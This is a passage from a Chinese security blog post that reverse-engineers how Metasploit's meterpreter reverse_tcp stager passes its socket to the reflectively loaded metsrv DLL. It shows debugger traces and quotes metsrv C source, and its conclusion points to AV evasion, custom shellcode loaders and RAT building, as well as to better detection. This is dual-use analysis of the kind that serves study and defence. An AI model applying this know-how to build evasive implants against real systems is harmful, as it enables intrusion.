</div><p>最开始的是0，pack的格式是Q，8位，这8位是干嘛的？</p>
<p>现在回过头想想，当之前生成好的dll载荷，我们从首地址开始跑，我们刚才那个edi(socket地址)填充到哪了，是不是那个dll空间的末尾再往后填，这个空间不恰好就是这8位0吗？</p>
<h2 id=所谓的sockedi到底是啥>所谓的sockedi到底是啥？<a hidden class=anchor aria-hidden=true href=#所谓的sockedi到底是啥>#</a></h2>
<h3 id=跟踪edi>跟踪edi<a hidden class=anchor aria-hidden=true href=#跟踪edi>#</a></h3>
<p>根据我们前面的分析，我们把<a href=https://github.com/rsmudge/metasploit-loader/blob/master/loader.exe>加载器</a>挂调试器跑起来看看</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/0ac8c276ed1f1946c31c5b4261bb368e..png alt="enter description here">
</p>
<p>首先分配完RWX内存空间后，我们看到了首地址 <code>0x6A0000</code>，然后我们在内存窗口中转到该地址，那我们重点关注的是dll所在区域的末尾，我们直接把内存地址转到 <code>0x6CAC06</code>（别问我怎么知道的，方法很多，比如多次调试）</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/b3cf2f3287ec9d02a562d7f83f619156..png alt="enter description here">
</p>
<p>我们首先把内存地址转到这个地方然后往下跑把数据接过来看看</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/d53b9248e68a4f95d8bdc663b7067b46..png alt="enter description here">
</p>
<p>现在前八位还是空的，但是后面已经有一些数据了，包括一些能看到文字的配置（比如tcp://0.0.0.0:4444）然后继续下跑，进到我们分配出来的函数去看看</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/e89a358c69064d2bdf833f56226f7c43..png alt="enter description here">
</p>
<p>首当其冲的就是我们的 <code>mov edi, &socket</code>，继续往下</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/9a740790478d8c81e6c9298cc0132643..png alt="enter description here">
</p>
<p>可以看到，和我们预期的一样，复制到了这八位的空间里面，这里可以配合msf源码以及我的注释查看</p>
<h3 id=分析用作载荷的反射dll>分析用作载荷的反射dll<a hidden class=anchor aria-hidden=true href=#分析用作载荷的反射dll>#</a></h3>
<p>还记得我们前面分析的源码中的metsrv dll文件吗？</p>
<p>我们可以在 <a href=https://github.com/rapid7/metasploit-payloads>metasploit-payloads</a> 中找到这个项目的源码</p>
<p>我们直接看看<a href=https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/metsrv.c#L47>metsrc dllmain函数</a></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue <span style=color:#f92672>=</span> TRUE;

	<span style=color:#66d9ef>switch</span> (dwReason)
	{
	<span style=color:#66d9ef>case</span> DLL_METASPLOIT_ATTACH:
		bReturnValue <span style=color:#f92672>=</span> Init((MetsrvConfig<span style=color:#f92672>*</span>)lpReserved);
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>case</span> DLL_QUERY_HMODULE:
		<span style=color:#66d9ef>if</span> (lpReserved <span style=color:#f92672>!=</span> NULL)
			<span style=color:#f92672>*</span>(HMODULE<span style=color:#f92672>*</span>)lpReserved <span style=color:#f92672>=</span> hAppInstance;
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
		hAppInstance <span style=color:#f92672>=</span> hinstDLL;
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
	<span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
	<span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
		<span style=color:#66d9ef>break</span>;
	}
	<span style=color:#66d9ef>return</span> bReturnValue;
}
</code></pre></td></tr></table>
</div>
</div><p>刚才调用dllmain我们是使用了 <code>calleax ;call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</code></p>
<p>我们这个 <code>config_ptr</code> 传递的是什么？是 <code>push ebx ; push the pointer to the configuration start</code>，也就是那个首8位塞了我们socket句柄地址的数据的起始地址，然后走 <code>DLL_METASPLOIT_ATTACH</code> 分支，把这个地址中的数据强转为了 <code>MetsrvConfig</code> 结构体</p>
<p>我们看看 <code>MetsrvConfig</code> 结构体</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _MetsrvConfig
{
	MetsrvSession session;
	MetsrvTransportCommon transports[<span style=color:#ae81ff>1</span>];  <span style=color:#75715e>///! Placeholder for 0 or more transports
</span><span style=color:#75715e></span>	<span style=color:#75715e>// Extensions will appear after this
</span><span style=color:#75715e></span>	<span style=color:#75715e>// After extensions, we get a list of extension initialisers
</span><span style=color:#75715e></span>	<span style=color:#75715e>// &lt;name of extension&gt;\x00&lt;datasize&gt;&lt;data&gt;
</span><span style=color:#75715e></span>	<span style=color:#75715e>// &lt;name of extension&gt;\x00&lt;datasize&gt;&lt;data&gt;
</span><span style=color:#75715e></span>	<span style=color:#75715e>// \x00
</span><span style=color:#75715e></span>} MetsrvConfig;

<span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _MetsrvSession
{
	<span style=color:#66d9ef>union</span>
	{
		UINT_PTR handle;
		BYTE padding[<span style=color:#ae81ff>8</span>];
	} comms_handle;                       <span style=color:#75715e>///! Socket/handle for communications (if there is one).
</span><span style=color:#75715e></span>	DWORD exit_func;                      <span style=color:#75715e>///! Exit func identifier for when the session ends.
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> expiry;                           <span style=color:#75715e>///! The total number of seconds to wait before killing off the session.
</span><span style=color:#75715e></span>	BYTE uuid[UUID_SIZE];                 <span style=color:#75715e>///! UUID
</span><span style=color:#75715e></span>	BYTE session_guid[<span style=color:#66d9ef>sizeof</span>(GUID)];      <span style=color:#75715e>///! Current session GUID
</span><span style=color:#75715e></span>} MetsrvSession;

<span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _MetsrvTransportCommon
{
	CHARTYPE url[URL_SIZE];               <span style=color:#75715e>///! Transport url:  scheme://host:port/URI
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> comms_timeout;                    <span style=color:#75715e>///! Number of sessions to wait for a new packet.
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> retry_total;                      <span style=color:#75715e>///! Total seconds to retry comms for.
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> retry_wait;                       <span style=color:#75715e>///! Seconds to wait between reconnects.
</span><span style=color:#75715e></span>} MetsrvTransportCommon;
</code></pre></td></tr></table>
</div>
</div><p>这些信息很明显能看到是一些信息，比如uuid，重试次数之类的，这些在payload的生成选项里面都能找到</p>
<p>那么我们现在差不多明白了，这一块的东西是强转成了这个结构体，包括edi中所存放的socket句柄地址</p>
<p>好吧，别忘了我们的<strong>使命，搞清楚这个edi的作用</strong></p>
<p>划入这个结构体也就是</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>	union
	{
		UINT_PTR handle;
		BYTE padding[8];
	} comms_handle;                       ///! Socket/handle for communications (if there is one).
</code></pre></td></tr></table>
</div>
</div><p>也就是我们找找 <code>comms_handle</code> 用在了哪</p>
<p>所以进到 <code>Init((MetsrvConfig*)lpReserved)</code> 里面看看</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>DWORD <span style=color:#a6e22e>Init</span>(MetsrvConfig<span style=color:#f92672>*</span> metConfig)
{
	<span style=color:#75715e>// if hAppInstance is still == NULL it means that we havent been
</span><span style=color:#75715e></span>	<span style=color:#75715e>// reflectivly loaded so we must patch in the hAppInstance value
</span><span style=color:#75715e></span>	<span style=color:#75715e>// for use with loading server extensions later.
</span><span style=color:#75715e></span>	InitAppInstance();

	<span style=color:#75715e>// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it&#39;s actually
</span><span style=color:#75715e></span>	<span style=color:#75715e>// a pointer to the metserv configuration, so do a nasty cast and move on.
</span><span style=color:#75715e></span>	dprintf(<span style=color:#e6db74>&#34;[METSRV] Getting ready to init with config %p&#34;</span>, metConfig);
	DWORD result <span style=color:#f92672>=</span> server_setup(metConfig);

	dprintf(<span style=color:#e6db74>&#34;[METSRV] Exiting with %08x&#34;</span>, metConfig<span style=color:#f92672>-&gt;</span>session.exit_func);

	<span style=color:#75715e>// We also handle exit func directly in metsrv now because the value is added to the
</span><span style=color:#75715e></span>	<span style=color:#75715e>// configuration block and we manage to save bytes in the stager/header as well.
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>switch</span> (metConfig<span style=color:#f92672>-&gt;</span>session.exit_func)
	{
	<span style=color:#66d9ef>case</span> EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>case</span> EXITFUNC_THREAD:
		ExitThread(<span style=color:#ae81ff>0</span>);
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>case</span> EXITFUNC_PROCESS:
		ExitProcess(<span style=color:#ae81ff>0</span>);
		<span style=color:#66d9ef>break</span>;
	<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
		<span style=color:#66d9ef>break</span>;
	}
	<span style=color:#66d9ef>return</span> result;
}
</code></pre></td></tr></table>
</div>
</div><p>里面调用了 <code>server_setup</code> 然后吐出了结果，最后返回，跟到外层也就是dllmain的返回值，dllmain返回值作用我不赘述了，然后根据你的生成选项中的 <code>EXITFUNC</code> 来进行退出，退出进程、线程或者SEH异常，这里我们不管，我们看看 <code>server_setup</code> 函数</p>
<p><a href=https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_setup.c#L317>server_setup函数</a>很长，我就不贴整个函数了</p>
<p>使用了 <code>comms_handle</code> 的我贴一下</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>...
dprintf(<span style=color:#e6db74>&#34;[SESSION] Comms handle: %u&#34;</span>, config<span style=color:#f92672>-&gt;</span>session.comms_handle);
...

dprintf(<span style=color:#e6db74>&#34;[DISPATCH] Transport handle is %p&#34;</span>, (LPVOID)config<span style=color:#f92672>-&gt;</span>session.comms_handle.handle);
<span style=color:#66d9ef>if</span> (remote<span style=color:#f92672>-&gt;</span>transport<span style=color:#f92672>-&gt;</span>set_handle)
{
    remote<span style=color:#f92672>-&gt;</span>transport<span style=color:#f92672>-&gt;</span>set_handle(remote<span style=color:#f92672>-&gt;</span>transport, config<span style=color:#f92672>-&gt;</span>session.comms_handle.handle);
}
</code></pre></td></tr></table>
</div>
</div><p>根据这些代码我们能够知道是把 Transport handle 设置为了我们之前创建的socket</p>
<p>继续往后找我们能找到</p>
<p><img loading=lazy src=https://https://cdn.staticaly.com/gh/akkuman/pic/master/pic/2021/8/2c9398d368f42a09d7d0f0877b461c79..png alt="enter description here">
</p>
<p>然后跟进 <code>transport_set_handle_tcp</code> 可以看到</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>/*!
 * @brief Get the socket from the transport (if it&#39;s TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static UINT_PTR transport_get_handle_tcp(Transport* transport)
{
	if (transport &amp;&amp; transport-&gt;type == METERPRETER_TRANSPORT_TCP)
	{
		return (UINT_PTR)((TcpTransportContext*)transport-&gt;ctx)-&gt;fd;
	}

	return 0;
}

/*!
 * @brief Set the socket from the transport (if it&#39;s TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @param handle The current transport socket FD, if any.
 */
static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
{
	if (transport &amp;&amp; transport-&gt;type == METERPRETER_TRANSPORT_TCP)
	{
		((TcpTransportContext*)transport-&gt;ctx)-&gt;fd = (SOCKET)handle;
	}
}
</code></pre></td></tr></table>
</div>
</div><p>也只是转为了socket句柄，然后给外部再继续通过这个socket去取一些服务器上的东西（后面的我没再跟下去了，我猜测也只有这种可能）</p>
<h2 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h2>
<p>这次的分析耗时一天，从上午看到讨论免杀，加载器，然后开始分析，说实话，还是收获了不少，比如那个反射dll的改dos头就让我不得不佩服，卧槽，这操作骚。本次只是拿 <code>windows/meterpreter/reverse_tcp</code> 开刀，我相信其他的也一样，不然何以被官方称 <code>sockedi</code> 调用约定，说明这已经是msf里面加载的约定成俗的东西了。</p>
<p>那么从这次的分析中我们能获得哪些启示？当然是免杀对抗的启示，antiAV方可以通过研究使用自己的payload格式，AV方可以通过这个流程来对msf的payload的查杀更上一步，或者根据里面的改DOS头技术打造自己的模块化RAT</p>
<h3 id=下一步可以做的>下一步可以做的<a hidden class=anchor aria-hidden=true href=#下一步可以做的>#</a></h3>
<ol>
<li>研究payload uuid的回传</li>
<li>研究rc4，aes之类的所谓加密shellcode，加密是在哪里</li>
<li>&mldr;</li>
</ol>
<h3 id=现在就可以得到的>现在就可以得到的<a hidden class=anchor aria-hidden=true href=#现在就可以得到的>#</a></h3>
<ol>
<li>当然是一个香喷喷的shellcode加载器，具体实现就是八仙过海各显神通了。</li>
<li>改DOS头直接执行的技术</li>
</ol>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=http://hacktech.cn/tags/msf/>msf</a></li>
<li><a href=http://hacktech.cn/tags/%E7%BA%A2%E9%98%9F/>红队</a></li>
<li><a href=http://hacktech.cn/tags/%E5%B7%A5%E5%85%B7/>工具</a></li>
<li><a href=http://hacktech.cn/tags/%E9%80%86%E5%90%91/>逆向</a></li>
</ul>
<nav class=paginav>
<a class=prev href=http://hacktech.cn/2020/05/12/open-source-theme-cnblogs-bad-or-not/>
<span class=title>« 上一页</span>
<br>
<span>博客园某开源主题暗藏私货？</span>
</a>
<a class=next href=http://hacktech.cn/2020/05/07/msf-rpc-and-jsonrpc-compare/>
<span class=title>下一页 »</span>
<br>
<span>msf的rpc和json-rpc，我该选择哪个？</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on twitter" href="https://twitter.com/intent/tweet/?text=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29&url=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f&hashtags=msf%2c%e7%ba%a2%e9%98%9f%2c%e5%b7%a5%e5%85%b7%2c%e9%80%86%e5%90%91"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share metasploit payload运行原理浅析(sockedi调用约定是什么) on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f&title=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29&summary=metasploit%20payload%e8%bf%90%e8%a1%8c%e5%8e%9f%e7%90%86%e6%b5%85%e6%9e%90%28sockedi%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e6%98%af%e4%bb%80%e4%b9%88%29&source=http%3a%2f%2fhacktech.cn%2f2020%2f05%2f09%2fwhat-is-sockedi-call-convention-in-msf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 